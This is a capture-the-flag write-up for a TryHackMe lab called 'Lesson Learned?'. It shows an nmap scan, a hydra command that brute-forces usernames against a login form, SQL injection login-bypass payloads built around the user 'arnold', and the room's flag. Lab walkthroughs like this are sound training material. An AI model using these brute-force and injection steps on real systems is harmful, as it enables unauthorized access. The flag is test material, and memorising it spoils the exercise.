# TryHackMe Lesson Learned? Writeup

## nmap scan

```
nmap -sCV 10.10.171.129
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-08 10:15 EDT
Nmap scan report for 10.10.171.129
Host is up (0.61s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 2e:54:89:ae:f7:91:4e:33:6e:10:89:53:9c:f5:92:db (RSA)
|   256 dd:2c:ca:fc:b7:65:14:d4:88:a3:6e:55:71:65:f7:2f (ECDSA)
|_  256 2b:c2:d8:1b:f4:7b:e5:78:53:56:01:9a:83:f3:79:81 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Lesson Learned?
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.08 seconds
```

```
http://10.10.171.129/
```

![image](https://github.com/user-attachments/assets/a2ac97e7-2b9d-4e33-9ea8-1a28d80ca032)

if i try ``SQLI``

![image](https://github.com/user-attachments/assets/508faff6-a5cc-4840-9b3f-1f4160e422fd)

> ### so he block ``OR 1=1``

now try to bruteforece username 

```
hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -p asdf 10.10.171.129 http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password." 
```

![image](https://github.com/user-attachments/assets/4f78cfff-958e-4a4e-a0a1-78d93ffadc6b)

if i try to put username ``arnold`` and any password

![image](https://github.com/user-attachments/assets/e01339e8-5985-447b-89e0-1a0c7d64fb13)

now will try to inject sql but without using ``or 1=1``

![image](https://github.com/user-attachments/assets/f2b45232-fa17-4b9b-bba8-9b9ab2e9db10)

```
arnold' AND 'x'='x' -- -
arnold' -- -
.....
```

```
THM{aab02c6b76bb752456a54c80c2d6fb1e}
```

